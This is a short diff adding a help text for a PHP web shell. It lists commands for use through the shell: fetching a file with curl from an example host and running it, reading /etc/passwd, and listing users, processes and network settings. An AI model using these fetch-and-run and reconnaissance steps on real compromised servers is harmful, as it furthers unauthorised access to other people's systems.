@@ -1,0 +1,50 @@
+Primitive Remote BASH emulator (web-shell) in PHP
+
+Helpful commands:
+===================
+
+      DOWNLOAD FILE:
+      curl -O http://www.example.com/file.sh
+
+      FILE EXECUTION:
+      PY/PYW: python3 file.py
+      ELF: ./file
+      C: gcc file.c | ./a.out
+
+      VIEW PASSWD (USER) FILE:
+      cat /etc/passwd
+
+      VIEW IP/DHCP INFORMATION:
+      ifconfig
+      route -n
+
+      VIEW PROCESS/S:
+      ps
+      ps aux
+
+      LIST ALL USERS:
+      cut -d: -f1 /etc/passwd
+      awk -F: '{print $1}' /etc/passwd
+      who
+
+      DISPLAY USERGROUP:
+      groups <username>
+
+      VIEW INTERFACE/S:
+      iwconfig
+
+      INSTALL PYTHON MODULES:
+      pip3 install <module>
+      pip install <module>
+
+      VIEW INSTALLED COMPUTER-LANGUAGE VERSIONS:
+      PYTHON: python --version
+      CPP:    g++ --version
+      C:      gcc --version
+      PHP:    php --version
+      PERL:   perl --version
+      
+      
+
+
+
